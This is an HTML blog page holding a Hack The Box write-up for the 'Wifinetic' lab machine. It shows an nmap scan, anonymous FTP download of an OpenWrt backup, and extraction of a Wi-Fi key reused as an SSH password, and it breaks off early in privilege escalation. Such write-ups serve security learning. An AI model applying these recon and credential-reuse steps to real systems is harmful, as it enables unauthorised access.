@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB Writeup - Wifinetic (Easy) :: CyberSpider</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup of Wifinetic from Hack The Box." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/wifinetic/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="CyberSpider" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB Writeup - Wifinetic (Easy)">
+<meta property="og:description" content="Writeup of Wifinetic from Hack The Box." />
+<meta property="og:url" content="/posts/wifinetic/" />
+<meta property="og:site_name" content="CyberSpider" />
+
+  
+    <meta property="og:image" content="/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-09-17 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    cyberspider@ubuntu:~$
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/archive">archive</a></li>
+        
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/archive" >archive</a></li>
+        
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/wifinetic/">HTB Writeup - Wifinetic (Easy)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-09-17</time><span class="post-author">CyberSpider</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/htb/">htb</a>&nbsp;
+      
+      #<a href="/tags/easy/">easy</a>&nbsp;
+      
+      #<a href="/tags/linux/">linux</a>&nbsp;
+      
+      #<a href="/tags/anonymous-ftp/">Anonymous FTP</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>The <code>Wifinetic</code> machine is an easy linux box.</p>
+<p><img src="/images/Wifinetic.png#center" alt="Scenario 1: Across columns"></p>
+<h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a <code>nmap scan</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -sV -sC -A 10.10.11.247
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-09-15 15:27 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.247
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.11s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE    VERSION
+</span></span><span style="display:flex;"><span>21/tcp open  ftp        vsftpd 3.0.3
+</span></span><span style="display:flex;"><span>| ftp-syst: 
+</span></span><span style="display:flex;"><span>|   STAT: 
+</span></span><span style="display:flex;"><span>| FTP server status:
+</span></span><span style="display:flex;"><span>|      Connected to ::ffff:10.10.14.192
+</span></span><span style="display:flex;"><span>|      Logged in as ftp
+</span></span><span style="display:flex;"><span>|      TYPE: ASCII
+</span></span><span style="display:flex;"><span>|      No session bandwidth limit
+</span></span><span style="display:flex;"><span>|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>|      Control connection is plain text
+</span></span><span style="display:flex;"><span>|      Data connections will be plain text
+</span></span><span style="display:flex;"><span>|      At session startup, client count was <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>|      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span style="display:flex;"><span>|_End of status
+</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| -rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp          <span style="color:#ae81ff">4434</span> Jul <span style="color:#ae81ff">31</span> 11:03 MigrateOpenWrt.txt
+</span></span><span style="display:flex;"><span>| -rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp       <span style="color:#ae81ff">2501210</span> Jul <span style="color:#ae81ff">31</span> 11:03 ProjectGreatMigration.pdf
+</span></span><span style="display:flex;"><span>| -rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp         <span style="color:#ae81ff">60857</span> Jul <span style="color:#ae81ff">31</span> 11:03 ProjectOpenWRT.pdf
+</span></span><span style="display:flex;"><span>| -rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp         <span style="color:#ae81ff">40960</span> Sep <span style="color:#ae81ff">11</span> 15:25 backup-OpenWrt-2023-07-26.tar
+</span></span><span style="display:flex;"><span>|_-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp         <span style="color:#ae81ff">52946</span> Jul <span style="color:#ae81ff">31</span> 11:03 employees_wellness.pdf
+</span></span><span style="display:flex;"><span>22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>53/tcp open  tcpwrapped
+</span></span><span style="display:flex;"><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 29.44 seconds
+</span></span></code></pre></div><h2 id="ftp">FTP<a href="#ftp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do the <code>anonymous</code> login and I download different files:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ftp 10.10.11.247      
+</span></span><span style="display:flex;"><span>Connected to 10.10.11.247.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 3.0.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Name <span style="color:#f92672">(</span>10.10.11.247:kali<span style="color:#f92672">)</span>: Anonymous
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span> Login successful.
+</span></span><span style="display:flex;"><span>Remote system type is UNIX.
+</span></span><span style="display:flex;"><span>Using binary mode to transfer files.
+</span></span><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|44377|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp          <span style="color:#ae81ff">4434</span> Jul <span style="color:#ae81ff">31</span> 11:03 MigrateOpenWrt.txt
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp       <span style="color:#ae81ff">2501210</span> Jul <span style="color:#ae81ff">31</span> 11:03 ProjectGreatMigration.pdf
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp         <span style="color:#ae81ff">60857</span> Jul <span style="color:#ae81ff">31</span> 11:03 ProjectOpenWRT.pdf
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp         <span style="color:#ae81ff">40960</span> Sep <span style="color:#ae81ff">11</span> 15:25 backup-OpenWrt-2023-07-26.tar
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp         <span style="color:#ae81ff">52946</span> Jul <span style="color:#ae81ff">31</span> 11:03 employees_wellness.pdf
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Directory send OK.
+</span></span><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|45627|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp          <span style="color:#ae81ff">4434</span> Jul <span style="color:#ae81ff">31</span> 11:03 MigrateOpenWrt.txt
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp       <span style="color:#ae81ff">2501210</span> Jul <span style="color:#ae81ff">31</span> 11:03 ProjectGreatMigration.pdf
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp         <span style="color:#ae81ff">60857</span> Jul <span style="color:#ae81ff">31</span> 11:03 ProjectOpenWRT.pdf
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp         <span style="color:#ae81ff">40960</span> Sep <span style="color:#ae81ff">11</span> 15:25 backup-OpenWrt-2023-07-26.tar
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp         <span style="color:#ae81ff">52946</span> Jul <span style="color:#ae81ff">31</span> 11:03 employees_wellness.pdf
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Directory send OK.
+</span></span><span style="display:flex;"><span>ftp&gt; put MigrateOpenWrt.txt /home/kali/Wifinetic/MigrateOpenWrt.txt
+</span></span><span style="display:flex;"><span>local: MigrateOpenWrt.txt remote: /home/kali/Wifinetic/MigrateOpenWrt.txt
+</span></span><span style="display:flex;"><span>ftp: Can<span style="color:#e6db74">&#39;t open `MigrateOpenWrt.txt&#39;</span>: No such file or directory
+</span></span><span style="display:flex;"><span>ftp&gt; get MigrateOpenWrt.txt /home/kali/Wifinetic/MigrateOpenWrt.txt
+</span></span><span style="display:flex;"><span>local: /home/kali/Wifinetic/MigrateOpenWrt.txt remote: MigrateOpenWrt.txt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|42655|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> MigrateOpenWrt.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">4434</span> bytes<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>100% |**********************************************************************|  <span style="color:#ae81ff">4434</span>       23.36 MiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4434</span> bytes received in 00:00 <span style="color:#f92672">(</span>34.44 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; get ProjectGreatMigration.pdf /home/kali/Wifinetic/ProjectGreatMigration.pdf
+</span></span><span style="display:flex;"><span>local: /home/kali/Wifinetic/ProjectGreatMigration.pdf remote: ProjectGreatMigration.pdf
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|41557|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> ProjectGreatMigration.pdf <span style="color:#f92672">(</span><span style="color:#ae81ff">2501210</span> bytes<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>100% |**********************************************************************|  <span style="color:#ae81ff">2442</span> KiB  871.90 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2501210</span> bytes received in 00:02 <span style="color:#f92672">(</span>838.00 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; get ProjectOpenWRT.pdf /home/kali/Wifinetic/ProjectOpenWRT.pdf
+</span></span><span style="display:flex;"><span>local: /home/kali/Wifinetic/ProjectOpenWRT.pdf remote: ProjectOpenWRT.pdf
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|43667|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> ProjectOpenWRT.pdf <span style="color:#f92672">(</span><span style="color:#ae81ff">60857</span> bytes<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>100% |**********************************************************************| <span style="color:#ae81ff">60857</span>      214.93 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">60857</span> bytes received in 00:00 <span style="color:#f92672">(</span>147.82 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; get backup-OpenWrt-2023-07-26.tar /home/kali/Wifinetic/backup-OpenWrt-2023-07-26.tar
+</span></span><span style="display:flex;"><span>local: /home/kali/Wifinetic/backup-OpenWrt-2023-07-26.tar remote: backup-OpenWrt-2023-07-26.tar
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|41354|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> backup-OpenWrt-2023-07-26.tar <span style="color:#f92672">(</span><span style="color:#ae81ff">40960</span> bytes<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>100% |**********************************************************************| <span style="color:#ae81ff">40960</span>      247.62 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">40960</span> bytes received in 00:00 <span style="color:#f92672">(</span>143.64 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; get employees_wellness.pdf /home/kali/Wifinetic/employees_wellness.pdf
+</span></span><span style="display:flex;"><span>local: /home/kali/Wifinetic/employees_wellness.pdf remote: employees_wellness.pdf
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|41681|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> employees_wellness.pdf <span style="color:#f92672">(</span><span style="color:#ae81ff">52946</span> bytes<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>100% |**********************************************************************| <span style="color:#ae81ff">52946</span>      223.83 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">52946</span> bytes received in 00:00 <span style="color:#f92672">(</span>149.35 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; 
+</span></span></code></pre></div><h2 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I extract the files from <code>backup-OpenWrt-2023-07-26.tar</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Wifinetic<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ tar -xf  backup-OpenWrt-2023-07-26.tar
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Wifinetic<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls
+</span></span><span style="display:flex;"><span>backup-OpenWrt-2023-07-26.tar  etc                 ProjectGreatMigration.pdf
+</span></span><span style="display:flex;"><span>employees_wellness.pdf         MigrateOpenWrt.txt  ProjectOpenWRT.pdf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Wifinetic<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ tree etc                              
+</span></span><span style="display:flex;"><span>etc
+</span></span><span style="display:flex;"><span>├── config
+</span></span><span style="display:flex;"><span>│   ├── dhcp
+</span></span><span style="display:flex;"><span>│   ├── dropbear
+</span></span><span style="display:flex;"><span>│   ├── firewall
+</span></span><span style="display:flex;"><span>│   ├── luci
+</span></span><span style="display:flex;"><span>│   ├── network
+</span></span><span style="display:flex;"><span>│   ├── rpcd
+</span></span><span style="display:flex;"><span>│   ├── system
+</span></span><span style="display:flex;"><span>│   ├── ucitrack
+</span></span><span style="display:flex;"><span>│   ├── uhttpd
+</span></span><span style="display:flex;"><span>│   └── wireless
+</span></span><span style="display:flex;"><span>├── dropbear
+</span></span><span style="display:flex;"><span>│   ├── dropbear_ed25519_host_key
+</span></span><span style="display:flex;"><span>│   └── dropbear_rsa_host_key
+</span></span><span style="display:flex;"><span>├── group
+</span></span><span style="display:flex;"><span>├── hosts
+</span></span><span style="display:flex;"><span>├── inittab
+</span></span><span style="display:flex;"><span>├── luci-uploads
+</span></span><span style="display:flex;"><span>├── nftables.d
+</span></span><span style="display:flex;"><span>│   ├── 10-custom-filter-chains.nft
+</span></span><span style="display:flex;"><span>│   └── README
+</span></span><span style="display:flex;"><span>├── opkg
+</span></span><span style="display:flex;"><span>│   └── keys
+</span></span><span style="display:flex;"><span>│       └── 4d017e6f1ed5d616
+</span></span><span style="display:flex;"><span>├── passwd
+</span></span><span style="display:flex;"><span>├── profile
+</span></span><span style="display:flex;"><span>├── rc.local
+</span></span><span style="display:flex;"><span>├── shells
+</span></span><span style="display:flex;"><span>├── shinit
+</span></span><span style="display:flex;"><span>├── sysctl.conf
+</span></span><span style="display:flex;"><span>├── uhttpd.crt
+</span></span><span style="display:flex;"><span>└── uhttpd.key
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7</span> directories, <span style="color:#ae81ff">26</span> files
+</span></span></code></pre></div><p>I read the <code>passwd</code> file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Wifinetic/etc<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat passwd 
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/ash
+</span></span><span style="display:flex;"><span>daemon:*:1:1:daemon:/var:/bin/false
+</span></span><span style="display:flex;"><span>ftp:*:55:55:ftp:/home/ftp:/bin/false
+</span></span><span style="display:flex;"><span>network:*:101:101:network:/var:/bin/false
+</span></span><span style="display:flex;"><span>nobody:*:65534:65534:nobody:/var:/bin/false
+</span></span><span style="display:flex;"><span>ntp:x:123:123:ntp:/var/run/ntp:/bin/false
+</span></span><span style="display:flex;"><span>dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
+</span></span><span style="display:flex;"><span>logd:x:514:514:logd:/var/run/logd:/bin/false
+</span></span><span style="display:flex;"><span>ubus:x:81:81:ubus:/var/run/ubus:/bin/false
+</span></span><span style="display:flex;"><span>netadmin:x:999:999::/home/netadmin:/bin/false
+</span></span></code></pre></div><p>I see different users:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Wifinetic/etc<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat passwd | grep /home
+</span></span><span style="display:flex;"><span>ftp:*:55:55:ftp:/home/ftp:/bin/false
+</span></span><span style="display:flex;"><span>netadmin:x:999:999::/home/netadmin:/bin/false
+</span></span></code></pre></div><p>Now I can enumerate the <code>etc</code> directory and I discover a password:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Wifinetic/etc<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cd config              
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Wifinetic/etc/config<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat wireless           
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>config wifi-device <span style="color:#e6db74">&#39;radio0&#39;</span>
+</span></span><span style="display:flex;"><span>        option type <span style="color:#e6db74">&#39;mac80211&#39;</span>
+</span></span><span style="display:flex;"><span>        option path <span style="color:#e6db74">&#39;virtual/mac80211_hwsim/hwsim0&#39;</span>
+</span></span><span style="display:flex;"><span>        option cell_density <span style="color:#e6db74">&#39;0&#39;</span>
+</span></span><span style="display:flex;"><span>        option channel <span style="color:#e6db74">&#39;auto&#39;</span>
+</span></span><span style="display:flex;"><span>        option band <span style="color:#e6db74">&#39;2g&#39;</span>
+</span></span><span style="display:flex;"><span>        option txpower <span style="color:#e6db74">&#39;20&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>config wifi-device <span style="color:#e6db74">&#39;radio1&#39;</span>
+</span></span><span style="display:flex;"><span>        option type <span style="color:#e6db74">&#39;mac80211&#39;</span>
+</span></span><span style="display:flex;"><span>        option path <span style="color:#e6db74">&#39;virtual/mac80211_hwsim/hwsim1&#39;</span>
+</span></span><span style="display:flex;"><span>        option channel <span style="color:#e6db74">&#39;36&#39;</span>
+</span></span><span style="display:flex;"><span>        option band <span style="color:#e6db74">&#39;5g&#39;</span>
+</span></span><span style="display:flex;"><span>        option htmode <span style="color:#e6db74">&#39;HE80&#39;</span>
+</span></span><span style="display:flex;"><span>        option cell_density <span style="color:#e6db74">&#39;0&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>config wifi-iface <span style="color:#e6db74">&#39;wifinet0&#39;</span>
+</span></span><span style="display:flex;"><span>        option device <span style="color:#e6db74">&#39;radio0&#39;</span>
+</span></span><span style="display:flex;"><span>        option mode <span style="color:#e6db74">&#39;ap&#39;</span>
+</span></span><span style="display:flex;"><span>        option ssid <span style="color:#e6db74">&#39;OpenWrt&#39;</span>
+</span></span><span style="display:flex;"><span>        option encryption <span style="color:#e6db74">&#39;psk&#39;</span>
+</span></span><span style="display:flex;"><span>        option key <span style="color:#e6db74">&#39;VeRyUniUqWiFIPasswrd1!&#39;</span>
+</span></span><span style="display:flex;"><span>        option wps_pushbutton <span style="color:#e6db74">&#39;1&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>config wifi-iface <span style="color:#e6db74">&#39;wifinet1&#39;</span>
+</span></span><span style="display:flex;"><span>        option device <span style="color:#e6db74">&#39;radio1&#39;</span>
+</span></span><span style="display:flex;"><span>        option mode <span style="color:#e6db74">&#39;sta&#39;</span>
+</span></span><span style="display:flex;"><span>        option network <span style="color:#e6db74">&#39;wwan&#39;</span>
+</span></span><span style="display:flex;"><span>        option ssid <span style="color:#e6db74">&#39;OpenWrt&#39;</span>
+</span></span><span style="display:flex;"><span>        option encryption <span style="color:#e6db74">&#39;psk&#39;</span>
+</span></span><span style="display:flex;"><span>        option key <span style="color:#e6db74">&#39;VeRyUniUqWiFIPasswrd1!&#39;</span>
+</span></span></code></pre></div><p>Credentials:</p>
+<pre tabindex="0"><code>- Username: netadmin
+- Password: VeRyUniUqWiFIPasswrd1!
+</code></pre><p>I login to ssh like netadmin and I find the <code>user flag</code>:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ ssh netadmin@10.10.11.247
+netadmin@10.10.11.247&#39;s password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri 15 Sep 2023 08:44:01 PM UTC
+
+  System load:            0.4
+  Usage of /:             71.6% of 4.76GB
+  Memory usage:           11%
+  Swap usage:             0%
+  Processes:              228
+  Users logged in:        0
+  IPv4 address for eth0:  10.10.11.247
+  IPv6 address for eth0:  dead:beef::250:56ff:feb9:275e
+  IPv4 address for wlan0: 192.168.1.1
+  IPv4 address for wlan1: 192.168.1.23
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Fri Sep 15 20:06:03 2023 from 10.10.16.30
+netadmin@wifinetic:~$ ls
+ user.txt
+netadmin@wifinetic:~$ cat user.txt
+a736506bf4cd36cd3e179ec0f9bc9ac6
+netadmin@wifinetic:~$ 
+</code></pre><h2 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I check the <code>network interfaces</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netadmin@wifinetic:~$ ifconfig
+</span></span><span style="display:flex;"><span>eth0: flags<span style="color:#f92672">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style="color:#ae81ff">1500</span>
+</span></span><span style="display:flex;"><span>        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
+</span></span><span style="display:flex;"><span>        inet6 fe80::250:56ff:feb9:5b8e  prefixlen <span style="color:#ae81ff">64</span>  scopeid 0x20&lt;link&gt;
+</span></span><span style="display:flex;"><span>        inet6 dead:beef::250:56ff:feb9:5b8e  prefixlen <span style="color:#ae81ff">64</span>  scopeid 0x0&lt;global&gt;
